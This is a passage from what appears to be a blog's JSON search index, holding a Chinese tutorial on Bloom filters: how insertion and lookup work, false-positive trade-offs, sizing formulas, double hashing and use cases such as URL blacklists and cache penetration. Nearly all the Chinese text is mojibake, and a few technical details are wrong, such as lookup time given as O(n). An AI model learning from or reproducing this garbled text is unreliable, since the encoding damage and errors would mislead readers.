style=\"text-align:center;\">æ”¯ä»˜å®æ”¯ä»˜</td>\n         <td style=\"text-align:center;\">å¾®ä¿¡æ”¯ä»˜</td>\n     </tr>\n   <tr>\n    <td style=\"text-align:center;\" ><img width=\"200\" src=\"https://jwt1399.top/medias/reward/alipay.png\"></td>    \n      <td style=\"text-align:center;\"><img width=\"200\" src=\"https://jwt1399.top/medias/reward/sponor_wechat.png\"></td>     \n  </tr>\n</tbody></table>\n","tags":["Java8"],"categories":["JavaSE"]},{"title":"æ•°æ®ç»“æ„ï¼šå¸ƒéš†/å¸ƒè°·é¸Ÿ","url":"/posts/35196.html","content":"\n## å¸ƒéš†è¿‡æ»¤å™¨\n\n###  åŸç†\n\n**è®ºæ–‡åç§°ï¼šã€ŠSpace/time trade-offs in hash coding with allowable errorsã€‹(åœ¨å…è®¸é”™è¯¯çš„å“ˆå¸Œç¼–ç ä¸­ï¼Œç©ºé—´/æ—¶é—´çš„æƒè¡¡)**  â€”â€”`è¯¥ç¯‡è®ºæ–‡æ˜¯å¸ƒéš†è¿‡æ»¤å™¨çš„å¼€å±±ä¹‹ä½œ`\n\n- ä½œè€…ï¼šBurton H.Bloom\n\n- å•ä½ï¼šComputer Usage Company, Newton Upper Falls, MA\n\n- åˆŠç‰©ï¼š[Communications of the ACM](https://dl.acm.org/doi/10.1145/362686.362692)\n\n- æ—¶é—´ï¼š1970å¹´07æœˆ\n\n- ä¸»è¦å†…å®¹ï¼šç»™å®šä¸€ä¸ª setï¼ŒæŸ¥æ‰¾æŸä¸ª key æ˜¯å¦å­˜åœ¨äºè¯¥ setï¼Œé€šå¸¸è€ƒè™‘ä¸‰ç‚¹ï¼š\n\n  1. time: æŸ¥æ‰¾æ—¶é—´\n  2. space: ç©ºé—´æˆæœ¬(ä¾‹å¦‚ hash ç›®æ ‡åŒºåŸŸå¤§å°)\n  3. å…è®¸ä¸€å®šæ¦‚ç‡çš„è¯¯åˆ¤ï¼Œæ¥è·å–ç©ºé—´æˆæœ¬çš„æ˜¾è‘—é™ä½ã€‚\n\n------\n\næœ¬è´¨ä¸Šå¸ƒéš†è¿‡æ»¤å™¨æ˜¯ä¸€ç§æ¯”è¾ƒå·§å¦™çš„**æ¦‚ç‡å‹æ•°æ®ç»“æ„**ï¼ˆprobabilistic data structureï¼‰ï¼Œç‰¹ç‚¹æ˜¯é«˜æ•ˆåœ°æ’å…¥å’ŒæŸ¥è¯¢ï¼Œå¯ä»¥ç”¨æ¥å‘Šè¯‰ä½  **â€œæŸæ ·ä¸œè¥¿ä¸€å®šä¸å­˜åœ¨æˆ–è€…å¯èƒ½å­˜åœ¨â€**ã€‚ç›¸æ¯”äºä¼ ç»Ÿçš„ Listã€Setã€Map ç­‰æ•°æ®ç»“æ„ï¼Œå®ƒæ›´é«˜æ•ˆã€å ç”¨ç©ºé—´æ›´å°‘ï¼Œä½†æ˜¯ç¼ºç‚¹æ˜¯å…¶è¿”å›çš„**ç»“æœæ˜¯æ¦‚ç‡æ€§çš„**ï¼Œè€Œä¸æ˜¯ç¡®åˆ‡çš„ã€‚\n\n**BFçš„ç»„æˆï¼š**\n\n1. n ä¸ª å¾…æ’å…¥çš„ key\n2. m bits çš„ç©ºé—´ vï¼Œå…¨éƒ¨åˆå§‹åŒ–ä¸º0\n3. k ä¸ªæ— å…³çš„ hash å‡½æ•°ï¼š`h1, h2, ..., hk`ï¼Œhash ç»“æœä¸º` {0, 1, ..., m-1}`\n\nå…·ä½“çš„ï¼Œå¯¹äº `key=a`ï¼Œç»è¿‡ k ä¸ª hash å‡½æ•°åç»“æœä¸º `h1(a), h2(a), ..., hk(a)`\n\né‚£ä¹ˆå°±å°† v å¯¹åº”çš„ bit ç½®ä¸º 1ï¼Œå‡å®š k ä¸º 4ï¼Œå¯¹åº”çš„ bloom filter ä¸ºï¼š\n\n![](https://img.jwt1399.top/img/bloom_filter_with_4_hash_functions.gif)\n\n### æ’å…¥\n\nå¸ƒéš†è¿‡æ»¤å™¨ä¸Šé¢è¯´äº†ï¼Œå°±æ˜¯ä¸€ä¸ªäºŒè¿›åˆ¶æ•°æ®çš„é›†åˆã€‚å½“ä¸€ä¸ªæ•°æ®åŠ å…¥è¿™ä¸ªé›†åˆæ—¶ï¼Œç»å†å¦‚ä¸‹æ´—ç¤¼ï¼š[ã€åŠ¨æ€æ¼”ç¤ºã€‘](file:///Users/jianjian/Desktop/bloom-learn/zh_CN/index.html)\n\n- é€šè¿‡ K ä¸ªå“ˆå¸Œå‡½æ•°è®¡ç®—è¯¥æ•°æ®ï¼Œè¿”å› K ä¸ªè®¡ç®—å‡ºçš„ hash å€¼\n- è¿™ K ä¸ª hash å€¼æ˜ å°„åˆ°å¯¹åº”çš„ K ä¸ªäºŒè¿›åˆ¶çš„æ•°ç»„ä¸‹æ ‡\n- å°† K ä¸ªä¸‹æ ‡å¯¹åº”çš„äºŒè¿›åˆ¶æ•°æ®æ”¹æˆ 1 ã€‚\n\nä¾‹å¦‚ï¼Œå°†â€œä½ å¥½â€å­˜å…¥å¸ƒéš†è¿‡æ»¤å™¨ï¼Œç¬¬ä¸€ä¸ªå“ˆå¸Œå‡½æ•°è¿”å› 3ï¼Œç¬¬äºŒä¸ªç¬¬ä¸‰ä¸ªå“ˆå¸Œå‡½æ•°è¿”å› 5 ä¸ 7 ï¼Œé‚£ä¹ˆå¸ƒéš†è¿‡æ»¤å™¨å¯¹åº”çš„ä¸‹æ ‡3ï¼Œ5ï¼Œ7çš„ä½ç½®æ”¹æˆ1ã€‚\n\n![](https://img.jwt1399.top/img/640-20220125184517663)\n\n### æŸ¥æ‰¾\n\nå¸ƒéš†è¿‡æ»¤å™¨ä¸»è¦ä½œç”¨å°±æ˜¯æŸ¥è¯¢ä¸€ä¸ªæ•°æ®ï¼Œåœ¨ä¸åœ¨è¿™ä¸ªäºŒè¿›åˆ¶çš„é›†åˆä¸­ï¼ŒæŸ¥è¯¢è¿‡ç¨‹å¦‚ä¸‹ï¼š\n\n- é€šè¿‡ K ä¸ªå“ˆå¸Œå‡½æ•°è®¡ç®—è¯¥æ•°æ®ï¼Œå¯¹åº”è®¡ç®—å‡ºçš„ K ä¸ª hash å€¼\n- é€šè¿‡ hash å€¼æ‰¾åˆ°å¯¹åº”çš„äºŒè¿›åˆ¶çš„æ•°ç»„ä¸‹æ ‡\n- åˆ¤æ–­ï¼šå¦‚æœå­˜åœ¨ä¸€å¤„ä½ç½®çš„äºŒè¿›åˆ¶æ•°æ®æ˜¯ 0ï¼Œé‚£ä¹ˆè¯¥æ•°æ®ä¸å­˜åœ¨ã€‚å¦‚æœéƒ½æ˜¯1ï¼Œè¯¥æ•°æ®å­˜åœ¨é›†åˆä¸­ã€‚\n\næˆ‘ä»¬å‡è®¾ BF æ˜¯ä¸€ä¸ª 12bit çš„äºŒè¿›åˆ¶å‘é‡ï¼Œ{h1,h2}æ˜¯ä¸¤ä¸ªå“ˆå¸Œå‡½æ•°ï¼Œ{x,y,z}æ˜¯ä¸€ä¸ªé›†åˆã€‚ ç”¨æˆ·æƒ³æŸ¥è¯¢å…³é”®å­— w,æŸ¥è¯¢ç»“æœæ˜¾ç¤º w åœ¨é›†åˆä¸­ä¸å­˜åœ¨ã€‚\n\n![](https://img.jwt1399.top/img/image-20220126235419137.png)\n\n### å‡é˜³æ€§\n\n> å®å¯é”™æ€ä¸‰åƒï¼Œç»ä¸æ”¾è¿‡ä¸€ä¸ª\n\nå½“ key è¶Šæ¥è¶Šå¤šï¼Œv é‡Œç½®ä¸º 1 çš„ bits è¶Šæ¥è¶Šå¤šï¼Œå‰é¢è¢«ç½® 1 çš„ä½ç½®å¯èƒ½å°±ä¼šè¢«è¦†ç›–ï¼Œæ­¤æ—¶å°±æœ‰æ¦‚ç‡å‘ç”Ÿè¯¯åˆ¤ï¼Œæ›´ä¸“ä¸šçš„æœ¯è¯­ç§°ä¸º **false positive(å‡é˜³æ€§)**ï¼Œä¹Ÿå°±æ˜¯è¯´å½“æˆ‘ä»¬åœ¨ bloom filter æŸ¥æ‰¾ key æ—¶ï¼Œæœ‰è¿”å›ä¸¤ç§æƒ…å†µï¼š\n\n1. key ä¸å­˜åœ¨ï¼Œé‚£ä¹ˆ key **ä¸€å®šä¸å­˜åœ¨**ã€‚\n2. key å­˜åœ¨ï¼Œé‚£ä¹ˆ key **å¯èƒ½å­˜åœ¨**ã€‚\n\nä¹Ÿå°±æ˜¯è¯´ bloom filter å…·æœ‰ä¸€å®šçš„**è¯¯åˆ¤ç‡**ã€‚\n\nm è¶Šå¤§ï¼Œk è¶Šå¤§ï¼Œ n è¶Šå°ï¼Œé‚£ä¹ˆ **false positive**è¶Šå°ï¼Œæ›´è¿›ä¸€æ­¥ï¼Œbloom filter æ˜¯å…³äºç©ºé—´å’Œ **false positive** çš„ tradeoffï¼Œbloom filter çš„ç®—æ³•å…¶å®å¹¶ä¸å¤æ‚ï¼Œå…¶çœŸæ­£çš„è‰ºæœ¯åœ¨äºè¿™ç§å¹³è¡¡ã€‚\n\n### è¯¯æŠ¥ç‡å’Œå“ˆå¸Œä¸ªæ•°\n\nå¸ƒéš†è¿‡æ»¤å™¨éœ€ç›¸å…³å‚æ•°å¦‚ä¸‹ï¼š\n\n- nï¼šæ’å…¥å…ƒç´ çš„ä¸ªæ•°\n- Ïï¼šæ’å…¥n ä¸ªå…ƒç´ çš„æƒ…å†µä¸‹çš„è¯¯æŠ¥ç‡\n- mï¼šå¸ƒéš†è¿‡æ»¤å™¨ä½æ•°\n- kï¼šæ¯æ’å…¥ä¸€ä¸ªå…ƒç´ è¿›è¡Œçš„å“ˆå¸Œè½®æ•°\n\næ„é€ æ—¶ä¼šæä¾› n å’Œ Ï æ ¹æ®è¿™ä¸¤ä¸ªå‚æ•°ä¼šè®¡ç®—å‡ºå¸ƒéš†è¿‡æ»¤å™¨çš„å¤§å° mï¼Œå“ˆå¸Œå‡½æ•°çš„ä¸ªæ•° k\n\nå®ƒä»¬ä¹‹é—´çš„å…³ç³»æ¯”è¾ƒç®€å•ï¼š\n\n- è¯¯æŠ¥ç‡è¶Šä½ï¼Œå¸ƒéš†è¿‡æ»¤å™¨å°±éœ€è¦è¶Šé•¿ï¼Œä½†æ˜¯æ§ä»¶å ç”¨è¾ƒå¤§\n- è¯¯æŠ¥ç‡è¶Šä½ï¼Œæˆ–è€… hash å‡½æ•°è¶Šå¤šï¼Œä½†æ˜¯è®¡ç®—è€—æ—¶è¾ƒé•¿\n\n> å¦‚ä½•é€‰æ‹©åˆé€‚çš„å“ˆå¸Œå‡½æ•°ä¸ªæ•° k å’Œå¸ƒéš†è¿‡æ»¤å™¨é•¿åº¦ mï¼Œæœ‰äººæ¨å¯¼å‡ºäº†å¦‚ä¸‹å…¬å¼\n\n- nï¼šæ’å…¥å…ƒç´ çš„ä¸ªæ•°\n- Ïï¼šæ’å…¥n ä¸ªå…ƒç´ çš„æƒ…å†µä¸‹çš„è¯¯æŠ¥ç‡\n- mï¼šå¸ƒéš†è¿‡æ»¤å™¨ä½æ•°\n- kï¼šæ¯æ’å…¥ä¸€ä¸ªå…ƒç´ è¿›è¡Œçš„å“ˆå¸Œè½®æ•°\n\n1ã€æ ¹æ® Ï å’Œ  n å¯ä»¥è®¡ç®—å‡º  m å’Œ  k\n\n|                        å¸ƒéš†è¿‡æ»¤å™¨ä½æ•°                        |                       æœ€ä¼˜å“ˆå¸Œå‡½æ•°ä¸ªæ•°                       |\n| :----------------------------------------------------------: | :----------------------------------------------------------: |\n| ![](https://img.jwt1399.top/img/AF7D2AC5-2634-478A-9592-5FBC5106BA39.png) | ![](https://img.jwt1399.top/img/AC392E3A-F8F1-4CDC-903E-4066AB085A47.png) |\n\n2ã€æ ¹æ® mã€ nã€k å¯ä»¥è®¡ç®—å‡º Ï\n\n![](https://img.jwt1399.top/img/1*4QvZrOV7d9XgQXqVaIOGPg.png)\n\n### å“ˆå¸Œé€‰å–\n\n2008å¹´5æœˆå“ˆä½›å¤§å­¦çš„ä¸€ç¯‡è®ºæ–‡æŒ‡å‡º**å¯ä»¥ä½¿ç”¨ 2 ä¸ªå“ˆå¸Œå‡½æ•°æ¥æ¨¡æ‹Ÿå¤šä¸ªå“ˆå¸Œå‡½æ•°**\n\n**è®ºæ–‡åç§°ï¼šã€ŠLess hashing, same performance: Building a better Bloom filterã€‹(æ›´å°‘çš„æ•£åˆ—ï¼Œç›¸åŒçš„æ€§èƒ½ï¼šæ„å»ºæ›´å¥½çš„å¸ƒéš†è¿‡æ»¤å™¨)**\n\n- ä½œè€…ï¼šAdam Kirsch\n- å•ä½ï¼šå“ˆä½›å¤§å­¦\n- åˆŠç‰©ï¼š[ESA'06: Proceedings of the 14th conference on Annual European Symposium](https://www.eecs.harvard.edu/~michaelm/postscripts/rsa2008.pdf)ã€CCF Bã€‘\n- æ—¶é—´ï¼š2008å¹´05æœˆ\n- ä¸»è¦å†…å®¹ï¼šæ•£åˆ—æ–‡çŒ®ä¸­çš„ä¸€ç§æ ‡å‡†æŠ€æœ¯æ˜¯ä½¿ç”¨ä¸¤ä¸ªå“ˆå¸Œå‡½æ•° h<sub>1</sub>(x) å’Œ h<sub>2</sub>(x) æ¥æ¨¡æ‹Ÿ g<sub>i</sub>(x) = h<sub>1</sub>(x) + ih<sub>2</sub>(x) çš„é™„åŠ å“ˆå¸Œå‡½æ•°ã€‚æˆ‘ä»¬è¯æ˜äº†è¿™ç§æŠ€æœ¯å¯ä»¥æœ‰æ•ˆåœ°åº”ç”¨äº Bloom è¿‡æ»¤å™¨å’Œç›¸å…³çš„æ•°æ®ç»“æ„ã€‚å…·ä½“åœ°è¯´ï¼Œ**åªéœ€ä¸¤ä¸ªå“ˆå¸Œå‡½æ•°å°±å¯ä»¥æœ‰æ•ˆåœ°å®ç°ä¸€ä¸ªBloomè¿‡æ»¤å™¨**ï¼Œè€Œä¸ä¼šåœ¨æ¸è¿‘å‡é˜³æ€§æ¦‚ç‡ä¸Šæœ‰ä»»ä½•æŸå¤±ã€‚è¿™å°†å¯¼è‡´æ›´å°‘çš„è®¡ç®—ï¼Œå¹¶ä¸”åœ¨å®è·µä¸­å¯èƒ½æ›´ä¸éœ€è¦éšæœºæ€§ã€‚\n\nè¿™ç¯‡è®ºæ–‡æ¶‰åŠå¤§é‡çš„æ•°å­¦æ¨å¯¼ï¼Œä¸€å…± 32 é¡µï¼ŒğŸ¥¹ğŸ¥¶ğŸ˜­ï¼Œæˆ‘å½“ç„¶æ˜¯æ²¡æœ‰çœ‹å®Œçš„ï¼Œæ„Ÿå…´è¶£çš„å¤§ä½¬å¯ä»¥ä»”ç»†é˜…è¯»ï¼Œå¯ä»¥æŠŠæˆ‘ä¸Šé¢ä¸»è¦æ€æƒ³ä¸­çš„å™è¿°ä½œä¸ºä¸€ä¸ªç»“è®ºåœ¨å·¥ç¨‹å®è·µä¸­ä½¿ç”¨ã€‚\n\nå¦ä¸€ä¸ªé‡ç‚¹ï¼šç”±äºä½¿ç”¨å¸ƒéš†è¿‡æ»¤å™¨çš„å”¯ä¸€ç›®çš„æ˜¯ä¸ºäº†æ›´å¿«åœ°æœç´¢ï¼Œæˆ‘ä»¬ä¸èƒ½ä½¿ç”¨æ…¢æ•£åˆ—å‡½æ•°ï¼ŒSha-1ã€MD5 ç­‰åŠ å¯†å“ˆå¸Œå‡½æ•°å¯¹äºå¸ƒéš†è¿‡æ»¤å™¨æ¥è¯´ä¸æ˜¯å¾ˆå¥½çš„é€‰æ‹©ï¼Œå› ä¸ºå®ƒä»¬æœ‰ç‚¹æ…¢ã€‚å› æ­¤ï¼Œæ›´å¿«çš„æ•£åˆ—å‡½æ•°å®ç°çš„æ›´å¥½ï¼Œæœ€å¥½é€‰æ‹© [murmur](https://sites.google.com/site/murmurhash/)ã€[fnv](http://isthe.com/chongo/tech/comp/fnv/)ç³»åˆ—æ•£åˆ—ã€Jenkins æ•£åˆ—å’Œ[HashMix](https://www.google.com/codesearch/url?ct=ext&url=http://www.concentric.net/~Ttwang/tech/inthash.htm&usg=AFQjCNEBOwEAd_jb5vYSckmG7OxrkeQhLA)æ•£åˆ—\n\n### ä¼˜ç¼ºç‚¹\n\n**ä¼˜ç‚¹ï¼š**\n\n1. é›†åˆå…ƒç´ å¯ä»¥å¢åŠ \n2. åˆ¤æ–­çš„æ—¶é—´å¤æ‚åº¦ä¸ºO(n)ï¼Œç©ºé—´å¤æ‚åº¦ä¸ºO(1)\n\n**ç¼ºç‚¹ï¼š**\n\n1. é›†åˆä¸­çš„å…ƒç´ åªèƒ½å¢åŠ ä¸å¯ä»¥åˆ é™¤\n2. å­˜åœ¨ä¸€å®šçš„å‡é˜³ç‡ï¼Œä¹Ÿå°±æ˜¯è¯´ï¼Œå­˜åœ¨ä¸€å®šçš„å¯èƒ½æ€§ï¼Œè¯¥å…ƒç´ ä¸åœ¨é›†åˆä¸­ï¼Œä½†æ˜¯åˆ¤æ–­çš„ç»“æœå´è¡¨æ˜åœ¨é›†åˆä¸­\n\n### ä½¿ç”¨åœºæ™¯\n\n#### åœºæ™¯åˆ—è¡¨\n\n- å¤§é›†åˆä¸­é‡å¤å…ƒç´ çš„åˆ¤æ–­\n\n- ä½¿ç”¨å¸ƒéš†è¿‡æ»¤å™¨å‡å°‘å¯¹ä¸å­˜åœ¨çš„èµ„æºæˆ–ä¸è¢«å…è®¸çš„è¯·æ±‚è¿›è¡Œè€—è´¹æ€§èƒ½çš„ç½‘ç»œæŸ¥æ‰¾\n\n- é˜²æ­¢ç”¨æˆ·æ›´æ”¹äº§å“idè¿›è¡Œé‡æ–°è¯·æ±‚è€Œå¯¼è‡´çš„ç¼“å­˜å‡»ç©¿\n\n- åˆ©ç”¨å¸ƒéš†è¿‡æ»¤å™¨å‡å°‘ç£ç›˜IOæˆ–è€…ç½‘ç»œè¯·æ±‚\n\n- çˆ¬è™«ç³»ç»Ÿä¸­ï¼Œå¯¹URLè¿›è¡Œå»é‡\n\n- **URLé»‘åå•ã€ç™½åå•**ï¼Œæ¯”å¦‚Chromeæµè§ˆå™¨å°±æ˜¯ä½¿ç”¨äº†ä¸€ä¸ªå¸ƒéš†è¿‡æ»¤å™¨è¯†åˆ«æ¶æ„é“¾æ¥ã€‚\n\n- Redisé˜²é›ªå´©ï¼ˆç¼“å­˜ç©¿é€ï¼‰\n\n- é‚®ç®±ç³»ç»Ÿçš„åƒåœ¾é‚®ä»¶è¿‡æ»¤\n\n- è°·æ­ŒBigtableã€Apache HBaseã€Apache Cassandraå’ŒPostgreSQLä½¿ç”¨å¸ƒéš†è¿‡æ»¤å™¨æ¥**å‡å°‘å¯¹ä¸å­˜åœ¨çš„è¡Œæˆ–åˆ—çš„ç£ç›˜æŸ¥æ‰¾**(åŠ å¿«æ•°æ®åº“æŸ¥è¯¢è¿‡ç¨‹)ã€‚\n\n- **è§£å†³ç¼“å­˜ç©¿é€é—®é¢˜**ï¼Œç¼“å­˜ç©¿é€æŒ‡æŸ¥è¯¢ä¸€ä¸ªä¸å­˜åœ¨çš„æ•°æ®ï¼Œè¿™æ—¶å€™ç¼“å­˜ä¸­ä¸å­˜åœ¨ï¼Œå°±ä¼šä¸æ–­çš„æŸ¥è¯¢æ•°æ®åº“ï¼Œé€ æˆä¸å¿…è¦çš„IOï¼Œè€Œä¸”æœ‰äººå¦‚æœæ¶æ„ä½¿ç”¨ä¸å­˜åœ¨çš„keyä¹Ÿå¯ä»¥å¯¹æ•°æ®åº“è¿›è¡Œæ”»å‡»ã€‚\n\n- é«˜å¹¶å‘ç§’æ€ç³»ç»Ÿä¸­æŠ¢çº¢åŒ…ç³»ç»Ÿä¸­åˆ¤æ–­ç”¨æˆ·æ˜¯å¦ä»Šå¤©å·²é¢†å–çº¢åŒ…\n\n- LevelDBå¢åŠ æŸ¥è¯¢æ•ˆç‡\n\n  -  LevelDBåˆ©ç”¨å¸ƒéš†è¿‡æ»¤å™¨åˆ¤æ–­æŒ‡å®šçš„keyæ˜¯å¦å­˜åœ¨äºsstableä¸­ï¼Œè‹¥è¿‡æ»¤å™¨è¡¨ç¤ºä¸å­˜åœ¨ï¼Œåˆ™è¯¥keyä¸€å®šä¸å­˜åœ¨ã€‚\n\n- è§†é¢‘ç½‘ç«™ï¼Œä½¿ç”¨å¸ƒéš†è¿‡æ»¤å™¨æ¥æ£€æŸ¥æ¨èçš„è§†é¢‘å†…å®¹æ˜¯å¦å·²ç»è¢«æ¨èè¿‡ã€‚\n\n- ä¸€äº›äº¤å‹è½¯ä»¶ï¼Œæ¯æ¬¡æŠ“å–ä¸€æ‰¹æ¨èç»™ç”¨æˆ·å‰ç«¯ï¼Œåˆ©ç”¨ä¸€ä¸ªå¸ƒéš†è¿‡æ»¤å™¨æ¥å®Œæˆè®°å½•ï¼Œæ¯æ¬¡æ£€æŸ¥æ˜¯å¦å·²è¢«æ¨èè¿‡\n\n#### å…·ä½“åœºæ™¯1\n\n> ä½ æ¥åˆ°ä¸€ä¸ªæ–°çš„å¼€å‘éœ€æ±‚ï¼Œéœ€è¦ä½ ä¸ºç”¨æˆ·æ³¨å†ŒæœåŠ¡è®¾è®¡ä¸€ä¸ªç”¨æˆ·åæ£€æŸ¥çš„ API æ¥å£, è¿™ä¸ªæ¥å£ä¼šæ ¹æ®ç”¨æˆ·è¾“å…¥çš„ç”¨æˆ·åä¸ç³»ç»Ÿä¸­æ‰€æœ‰è´¦å·çš„ç”¨æˆ·åè¿›è¡ŒåŒ¹é…æ£€æŸ¥ï¼Œå¦‚æœç”¨æˆ·åå·²ç»å­˜åœ¨ï¼Œåˆ™ä¼šæç¤ºç”¨æˆ·è¯¥åç§°å·²è¢«ä½¿ç”¨,æ— æ³•è¿›è¡Œæ³¨å†Œï¼Œå¦‚æœåç§°æœªè¢«å ç”¨ï¼Œåˆ™è¿”å›å…è®¸æ³¨å†Œã€‚\n\nè¿™ä¸ªéœ€æ±‚æ˜¯ä¸æ˜¯å¬ä¸Šå»å¾ˆç®€å•ï¼Œå®ç°ä¸Šæˆ‘ä»¬æœ‰ä»¥ä¸‹çš„å‡ ç§æ–¹æ¡ˆï¼š\n\n- **æ–¹æ¡ˆä¸€**ï¼šæ¯æ¬¡æ³¨å†ŒéªŒè¯çš„æ—¶å€™ç›´æ¥å»æ•°æ®åº“æ‰§è¡ŒSQL, æ£€æŸ¥æ˜¯å¦å­˜åœ¨ç›¸åŒç”¨æˆ·åã€‚\n  - æœ€ç®€å•ï¼Œé™¤äº†åŸæ•°æ®åº“å­˜å‚¨å¤–ï¼Œä¸éœ€è¦å¤–éƒ¨çš„æ•°æ®å­˜å‚¨æœåŠ¡ï¼Œä½†æ˜¯æ¯æ¬¡æŸ¥è¯¢è¿›è¡Œå…¨è¡¨æ‰«æï¼Œç‰¹åˆ«æ˜¯æ¶‰åŠåˆ°æ³¨å†Œç”¨æˆ·è¾ƒå¤šï¼Œåˆ†åº“åˆ†è¡¨è®¾çš„æƒ…å†µä¸‹ï¼Œèµ„æºå¼€é”€å¯ä¸æ˜¯ä¸€èˆ¬çš„å¤§ï¼ŒæŸ¥è¯¢æ•ˆç‡è‚¯å®šä¹Ÿä¸ä¼šå¤ªå¥½ã€‚\n-  **æ–¹æ¡ˆäºŒ**ï¼šå¯¼å‡ºä¸€ä»½ç”¨æˆ·ååˆ—è¡¨åˆ°ç¼“å­˜ï¼ˆå®šæœŸæˆ–è€…ä½¿ç”¨æ¶ˆæ¯é˜Ÿåˆ—ï¼‰ï¼Œæ¯æ¬¡å•ç‹¬çš„æŸ¥è¯¢ç¼“å­˜å®Œæˆæ£€æŸ¥\n  - å†…å­˜æ•°æ®æŸ¥è¯¢æ•ˆç‡æ¯”ç¬¬ä¸€ç§è¦å¥½ä¸€äº›ï¼Œä½†æ˜¯éœ€è¦é¢å¤–ç»´æŠ¤ä¸€å¥—ç¼“å­˜æœåŠ¡ï¼Œè¿ç»´æˆæœ¬ä¹Ÿä¸å°ï¼Œå¦å¤–æ•°æ®å­˜å‚¨æœåŠ¡åœ¨æ•°æ®é‡è¾ƒå¤§çš„æƒ…å†µä¸‹å ç”¨çš„å†…å­˜å¼€é”€ä¹Ÿä¼šè¾ƒå¤§ã€‚\n\n-  **æ–¹æ¡ˆäºŒ**ï¼šé€šè¿‡ä¸€ä¸ªå¸ƒéš†è¿‡æ»¤å™¨æ¥å®Œæˆæ ¡éªŒï¼Œè¿™ç§æ–¹å¼å…·æœ‰ç»´æŠ¤ç®€å•ï¼Œå ç”¨èµ„æºå°‘ï¼ŒæŸ¥è¯¢æ•ˆç‡é«˜çš„ä¼˜åŠ¿\n\n#### å…·ä½“åœºæ™¯2\n\n> å‡å¦‚éœ€è¦è¿‡æ»¤æŸäº›ä¸å®‰å…¨ç½‘é¡µï¼Œç°æœ‰ 100 äº¿ä¸ªé»‘åå•é¡µé¢ï¼Œæ¯ä¸ªç½‘é¡µçš„URLæœ€å¤šå ç”¨ 64 å­—èŠ‚ã€‚ç°è¦è®¾è®¡ä¸€ç§ç½‘é¡µè¿‡æ»¤ç³»ç»Ÿï¼Œå¯ä»¥æ ¹æ®ç½‘é¡µçš„URLåˆ¤æ–­è¯¥ç½‘é¡µæ˜¯å¦åœ¨é»‘åå•ä¸Šã€‚\n\n- **æ–¹æ¡ˆä¸€**ï¼šæœ€ç›´è§‚çš„æƒ³æ³•å¿…ç„¶æ˜¯ä½¿ç”¨ä¸€ä¸ªé›†åˆæˆ–è€…è¯´æ•°æ®ç»“æ„æ¥å­˜æ”¾é»‘åå• URLï¼Œæ¯”å¦‚æŸ¥æ‰¾æ ‘ã€Setã€map\n  - ä½†æ˜¯æ— è®ºä¸Šæ–¹å“ªç§ï¼Œä¸å¯é¿å…çš„æ˜¯æˆ‘ä»¬éœ€è¦å­˜å‚¨åŸå§‹çš„ URL å€¼ï¼Œä½†æ˜¯ URL å¹¶ä¸æ˜¯ä¸€ä¸ªå¾ˆçŸ­çš„å­—ç¬¦ä¸²ï¼ŒåŠ¨è¾„åå‡ /å‡ åå­—èŠ‚ï¼Œå‡è®¾ä¸€ä¸ª URL æœ‰30 å­—èŠ‚é‚£ä¹ˆ 100 äº¿ URL æ‰€å å†…å­˜å°±æ˜¯åå‡  Gï¼Œæ‰€ä»¥æ¯æ¬¡åˆ¤æ–­æ˜¯å¦å­˜åœ¨äºé»‘åå•ä¸­ï¼Œå°±è¦å ç”¨å¾ˆå¤§çš„å†…å­˜å¼€é”€ã€‚\n- **æ–¹æ¡ˆäºŒ**ï¼šä½†æ˜¯ï¼Œæˆ‘ä»¬éœ€è¦çš„ä»…ä»…æ˜¯çŸ¥é“æ˜¯å¦å­˜åœ¨è¿™ä¸€éœ€æ±‚ï¼Œå¯ä»¥ä¸éœ€è¦å…·ä½“çš„URLï¼Œæ‰€ä»¥ä»…ä»…å¯¹Ture or False è¿™ä¸ªé—®é¢˜ï¼Œå¯ä»¥ä½¿ç”¨ä½å›¾ï¼ˆBitMapï¼‰ç®—æ³•ï¼Œä½å›¾é¡¾åæ€ä¹‰å°±æ˜¯ï¼Œæ¯ä¸ªmap å€¼éƒ½ä½¿ç”¨ 1bitï¼Œè¿™æ ·å¤§å¤§é™ä½äº†å†…å­˜å¼€é”€ï¼Œå…·ä½“åšæ³•æ˜¯ï¼Œæˆ‘ä»¬ä½¿ç”¨ä¸€ä¸ªHashå‡½æ•°å°†URL æ˜ å°„åˆ°å¤§å°ä¸º n çš„ bit æ•°ç»„ä¸­ï¼Œå¹¶ç½®ç›¸åº”ä½ç½®ä¸º True è¿™æ ·æˆ‘ä»¬å¯ä»¥åœ¨å°½å¯èƒ½ä½çš„å†…å­˜å¼€é”€ä¸‹ï¼Œå®ç° O(1) æ—¶é—´çš„åˆ¤æ–­ URL æ˜¯å¦å­˜åœ¨é»‘åå•ä¸­ã€‚ä½†ä¸å¾—ä¸é¢å¯¹çš„ä¸€ä¸ªé—®é¢˜å°±æ˜¯ï¼Œå³ä½¿é‡‡å–å†å¥½çš„å“ˆå¸Œå‡½æ•°ï¼Œéƒ½ä¼šå‡ºç°å“ˆå¸Œå†²çªçš„æƒ…å†µï¼Œåœ¨æŸ¥è¯¢é˜¶æ®µå‡ºç°å“ˆå¸Œå†²çªæ„å‘³ç€**æŸ¥è¯¢é”™è¯¯ï¼Œ**ä¼šè¿”å›ä¸€ä¸ªé”™è¯¯çš„ç»“æœï¼Œè€Œæƒ³å°½å¯èƒ½çš„é™ä½å“ˆå¸Œå†²çªï¼Œæˆ‘ä»¬éœ€è¦ä½å›¾å¤§å°æ¯”é»‘åå•ä¸­ URL æ•°é‡å¤§çš„å¤šï¼Œæˆ‘ä»¬è€ƒè™‘éšæœºå“ˆå¸Œçš„æƒ…å†µä¸‹ï¼ŒæŸ¥è¯¢ç¢°æ’çš„æ¦‚ç‡æ˜¯ï¼šé»‘åå• URL æ•°é‡ /ä½å›¾å¤§å°ã€‚æ‰€ä»¥è¦æƒ³æŸ¥è¯¢å‡†ç¡®ç‡é«˜ï¼Œåˆå¸¦æ¥äº†æ›´é«˜çš„å†…å­˜å¼€é”€ï¼Œè€Œå¯ä»¥æœ‰æ•ˆæ”¹å–„è¿™ç§æƒ…å†µçš„ä¸€ç§æ•°æ®ç»“æ„å«åš**å¸ƒéš†è¿‡æ»¤å™¨ï¼ˆBloom Filterï¼‰**\n\n#### å…·ä½“åœºæ™¯3\n\n> æµ·é‡æ•°æ®ä¸‹çš„å»é‡å’ŒæŸ¥é‡ï¼š10äº¿ä¸ªæ­£æ•´æ•°ï¼Œç»™å®šä¸€ä¸ªæ•°å€¼ï¼Œå¦‚ä½•å¿«é€Ÿåˆ¤å®šè¯¥æ•°å€¼æ˜¯å¦åœ¨ 10 